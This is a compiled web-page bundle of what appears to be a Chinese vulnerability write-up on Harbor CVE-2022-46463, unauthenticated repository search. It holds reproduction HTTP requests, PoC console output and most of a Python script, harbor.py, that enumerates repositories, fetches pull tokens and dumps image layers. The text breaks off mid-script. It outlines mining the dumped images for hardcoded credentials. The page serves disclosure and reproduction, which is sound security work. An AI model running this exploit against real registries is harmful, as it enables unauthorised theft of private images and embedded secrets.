import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as e,o as c,c as i,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const l={},u=p('<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Harbor 是为企业用户设计的容器镜像仓库开源项目，包括了权限管理 （RBAC）、LDAP、审计、安全漏洞扫描、镜像验真、管理界面、自我注册、HA 等企业必需的功能。Harbor api search 允许未认证的用户搜索仓库内存在的公开仓库，若将私有业务镜像放置于公开仓库，可能存在信息泄漏风险。</p><p>此漏洞披露时为未授权漏洞，漏洞影响存在争议。实际上该漏洞是由于安全配置不当，允许任意用户通过 <code>/api/search?q=</code> 接口搜索到所有公开仓库，下载公开仓库中的镜像（而非直接访问私有仓库）。但如果将私有业务镜像放置于公开仓库，可能存在信息泄漏风险，相应利用场景：</p><ol><li>下载包含敏感环境的公开镜像；</li><li>分析镜像，发现服务启动时进行了 jar 文件拷贝操作；</li><li>提取 jar 文件，反编译获取配置文件中硬编码的账号密码。</li></ol><p>参考链接：</p>',5),k={href:"https://mp.weixin.qq.com/s/pBkJW1_Vpf_suH50e8K9kg",target:"_blank",rel:"noopener noreferrer"},r={href:"https://mp.weixin.qq.com/s/V8Ecqq_DPOQhH5q9UBWkXg",target:"_blank",rel:"noopener noreferrer"},d={href:"https://github.com/404tk/CVE-2022-46463",target:"_blank",rel:"noopener noreferrer"},v=p(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>获取 harbor 信息：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /api/systeminfo HTTP/1.1   # harbor 1.x
GET /api/v2.0/systeminfo HTTP/1.1   # harbor 2.x
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240603114233720.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>获取全部 images 和 projects：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /api/search?q=/ HTTP/1.1
GET /api/v2.0/search?q=/ HTTP/1.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240603114414964.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>获取 images 的 version：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /api/repositories/&lt;PROJECT_NAME&gt;/&lt;IMAGE_NAME&gt;/tags?detail=1 HTTP/1.1
GET /api/v2.0/projects/&lt;PROJECT_NAME&gt;/repositories/&lt;IMAGE_NAME&gt;/artifacts?with_tag=true HTTP/1.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240603115023802.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>扩展场景：</p>`,11),m={href:"https://github.com/404tk/CVE-2022-46463",target:"_blank",rel:"noopener noreferrer"},b=n("li",null,"分析镜像，发现服务启动时进行了 jar 文件拷贝操作；",-1),g=n("li",null,"提取 jar 文件，反编译获取配置文件中硬编码的账号密码。",-1),q=p(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240603120457032.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240603120254668.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞-poc" tabindex="-1"><a class="header-anchor" href="#漏洞-poc" aria-hidden="true">#</a> 漏洞 POC</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>$ python3 harbor.py https://192.168.11.11
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> grafana/grafana
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> library/openjdk

$ python3 harbor.py https://192.168.11.11  <span class="token parameter variable">--dump</span> library/openjdk:8
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Dumping library/openjdk:8
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> 001c52e26ad57e3b25b439ee0052f6692e5c0f2d5d982a00a8819ace5e521452
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> d9d4b9b6e964657da49910b495173d6c4f0d9bc47b3b44273cf82fd32723d165
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> 2068746827ec1b043b571e4788693eab7e9b2a95301176512791f8c317a2816a
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> 9daef329d35093868ef75ac8b7c6eb407fa53abbcb3a264c218c2ec7bca716e6
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> d85151f15b6683b98f21c3827ac545188b1849efb14a1049710ebc4692de3dd5
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> 52a8c426d30b691c4f7e8c4b438901ddeb82ff80d4540d5bbd49986376d85cc9
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> 8754a66e005039a091c5ad0319f055be393c7123717b1f6fee8647c338ff3ceb

$ python3 harbor.py https://192.168.11.11 <span class="token parameter variable">--dump_all</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> grafana/grafana
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> library/openjdk
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Dumping grafana/grafana:latest
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> b39e2761d3d4971e78914857af4c6bd9989873b53426cf2fef3e76983b166fa2
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> c8ee6ca703b866ac2b74b6129d2db331936292f899e8e3a794474fdf81343605
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> c1de0f9cdfc1f9f595acd2ea8724ea92a509d64a6936f0e645c65b504e7e4bc6
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> 4007a89234b4f56c03e6831dc220550d2e5fba935d9f5f5bcea64857ac4f4888
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Dumping library/openjdk:8
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> 001c52e26ad57e3b25b439ee0052f6692e5c0f2d5d982a00a8819ace5e521452
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> d9d4b9b6e964657da49910b495173d6c4f0d9bc47b3b44273cf82fd32723d165
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> 2068746827ec1b043b571e4788693eab7e9b2a95301176512791f8c317a2816a
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> 9daef329d35093868ef75ac8b7c6eb407fa53abbcb3a264c218c2ec7bca716e6
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> d85151f15b6683b98f21c3827ac545188b1849efb14a1049710ebc4692de3dd5
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> 52a8c426d30b691c4f7e8c4b438901ddeb82ff80d4540d5bbd49986376d85cc9
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloading <span class="token builtin class-name">:</span> 8754a66e005039a091c5ad0319f055be393c7123717b1f6fee8647c338ff3ceb
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,4),f={href:"http://harbor.py",target:"_blank",rel:"noopener noreferrer"},y=p(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># -*- coding:utf-8 -*-</span>
<span class="token keyword">import</span> os
<span class="token keyword">import</span> tarfile
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> requests

requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>

CACHE_PATH <span class="token operator">=</span> <span class="token string">&quot;./caches/&quot;</span>
TIMEOUT <span class="token operator">=</span> <span class="token number">5</span>

<span class="token keyword">def</span> <span class="token function">manageArgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;URL&quot;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;--v2&quot;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;v2&#39;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;API v2.0&quot;</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&quot;store_true&quot;</span><span class="token punctuation">)</span>
    action <span class="token operator">=</span> parser<span class="token punctuation">.</span>add_mutually_exclusive_group<span class="token punctuation">(</span><span class="token punctuation">)</span>
    action<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;--dump&quot;</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">&quot;IMAGENAME&quot;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;dump&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;ImageName&quot;</span><span class="token punctuation">)</span>
    action<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;--tags&quot;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;tags&#39;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;list tags&quot;</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&quot;store_true&quot;</span><span class="token punctuation">)</span>
    action<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;--dump_all&quot;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;dump_all&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;dump all&quot;</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&quot;store_true&quot;</span><span class="token punctuation">)</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> args

<span class="token keyword">def</span> <span class="token function">createDir</span><span class="token punctuation">(</span>directoryName<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">&quot;../&quot;</span> <span class="token keyword">in</span> directoryName<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Hacker!&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>CACHE_PATH<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>directoryName<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>CACHE_PATH<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>directoryName<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">HarborUnauth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">getImages</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string">&quot;%s/api/search?q=&quot;</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>target
        url_v2 <span class="token operator">=</span> <span class="token string">&quot;%s/api/v2.0/search?q=/&quot;</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>target
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            req<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span>TIMEOUT<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> req<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>v2 <span class="token operator">=</span> <span class="token boolean">True</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[*] API version used v2.0&quot;</span><span class="token punctuation">)</span>
                req<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_v2<span class="token punctuation">,</span>timeout<span class="token operator">=</span>TIMEOUT<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            repos <span class="token operator">=</span> req<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;repository&quot;</span><span class="token punctuation">]</span>
            images <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
            <span class="token keyword">for</span> repo <span class="token keyword">in</span> repos<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+]&quot;</span><span class="token punctuation">,</span>repo<span class="token punctuation">[</span><span class="token string">&quot;repository_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> self<span class="token punctuation">.</span>list_tags<span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>getTags<span class="token punctuation">(</span>repo<span class="token punctuation">[</span><span class="token string">&quot;repository_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                images<span class="token punctuation">.</span>append<span class="token punctuation">(</span>repo<span class="token punctuation">[</span><span class="token string">&quot;repository_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> images
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Not vulnerability.&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">None</span>
    
    <span class="token keyword">def</span> <span class="token function">getTags</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>image_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        results <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        url <span class="token operator">=</span> <span class="token string">&quot;%s/api/repositories/%s/tags?detail=1&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>target<span class="token punctuation">,</span>image_name<span class="token punctuation">)</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>v2<span class="token punctuation">:</span>
            info <span class="token operator">=</span> image_name<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Image name format error.&quot;</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> results
            url <span class="token operator">=</span> <span class="token string">&quot;%s/api/v2.0/projects/%s/repositories/%s/artifacts?with_tag=true&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>target<span class="token punctuation">,</span>info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span>TIMEOUT<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            tags <span class="token operator">=</span> req<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> tag <span class="token keyword">in</span> tags<span class="token punctuation">:</span>
                <span class="token keyword">if</span> <span class="token string">&quot;name&quot;</span> <span class="token keyword">in</span> tag<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    tag_name <span class="token operator">=</span> tag<span class="token punctuation">[</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">]</span>
                <span class="token keyword">elif</span> tag<span class="token punctuation">[</span><span class="token string">&quot;tags&quot;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                    tag_name <span class="token operator">=</span> tag<span class="token punctuation">[</span><span class="token string">&quot;digest&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    tag_name <span class="token operator">=</span> tag<span class="token punctuation">[</span><span class="token string">&quot;tags&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">]</span>
                <span class="token keyword">if</span> self<span class="token punctuation">.</span>list_tags<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;    [*] </span><span class="token interpolation"><span class="token punctuation">{</span>image_name<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>tag_name<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
                results<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&quot;image&quot;</span><span class="token punctuation">:</span>image_name<span class="token punctuation">,</span><span class="token string">&quot;tag&quot;</span><span class="token punctuation">:</span>tag_name<span class="token punctuation">,</span><span class="token string">&quot;sha256&quot;</span><span class="token punctuation">:</span>tag<span class="token punctuation">[</span><span class="token string">&quot;digest&quot;</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> self<span class="token punctuation">.</span>list_tags<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Get tags failed, maybe you should specify the --v2 argument.&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> results
    
    <span class="token keyword">def</span> <span class="token function">getToken</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>image_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>target<span class="token punctuation">}</span></span><span class="token string">/service/token?scope=repository%3A</span><span class="token interpolation"><span class="token punctuation">{</span>image_name<span class="token punctuation">}</span></span><span class="token string">%3Apull&amp;service=harbor-registry&quot;</span></span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            req<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span>TIMEOUT<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            auth<span class="token operator">=</span>req<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;token&quot;</span><span class="token punctuation">]</span>
            <span class="token keyword">return</span> auth
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">&quot;&quot;</span>
    
    <span class="token keyword">def</span> <span class="token function">getBlob</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>image_name<span class="token punctuation">,</span>version<span class="token punctuation">,</span>digest<span class="token punctuation">,</span>header<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string">&quot;%s/v2/%s/manifests/%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>target<span class="token punctuation">,</span>image_name<span class="token punctuation">,</span>digest<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            req<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>timeout<span class="token operator">=</span>TIMEOUT<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            layers <span class="token operator">=</span> req<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;layers&quot;</span><span class="token punctuation">]</span>
            createDir<span class="token punctuation">(</span>image_name<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;_&quot;</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token operator">+</span>version<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;.&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;_&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> l <span class="token keyword">in</span> layers<span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>downloadSha<span class="token punctuation">(</span>image_name<span class="token punctuation">,</span>version<span class="token punctuation">,</span>l<span class="token punctuation">[</span><span class="token string">&quot;digest&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>header<span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-]&quot;</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">downloadSha</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>image_name<span class="token punctuation">,</span>version<span class="token punctuation">,</span>sha256<span class="token punctuation">,</span>header<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">dir</span> <span class="token operator">=</span> image_name<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;_&quot;</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token operator">+</span>version<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;.&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;_&quot;</span><span class="token punctuation">)</span>
        name <span class="token operator">=</span> sha256<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        filenamesha <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>CACHE_PATH<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">dir</span><span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">.tar.gz&quot;</span></span>
        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>target<span class="token punctuation">}</span></span><span class="token string">/v2/</span><span class="token interpolation"><span class="token punctuation">{</span>image_name<span class="token punctuation">}</span></span><span class="token string">/blobs/</span><span class="token interpolation"><span class="token punctuation">{</span>sha256<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            req<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>timeout<span class="token operator">=</span>TIMEOUT<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> req<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;    [+] Downloading : </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filenamesha<span class="token punctuation">,</span> <span class="token string">&#39;wb&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>
                    <span class="token keyword">for</span> bits <span class="token keyword">in</span> req<span class="token punctuation">.</span>iter_content<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>bits<span class="token punctuation">)</span>
                tf <span class="token operator">=</span> tarfile<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>filenamesha<span class="token punctuation">)</span>
                tf<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>CACHE_PATH<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">dir</span><span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
                os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>filenamesha<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;    [-] Download fail:&quot;</span><span class="token punctuation">,</span>req<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>target <span class="token operator">=</span> args<span class="token punctuation">.</span>url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span>
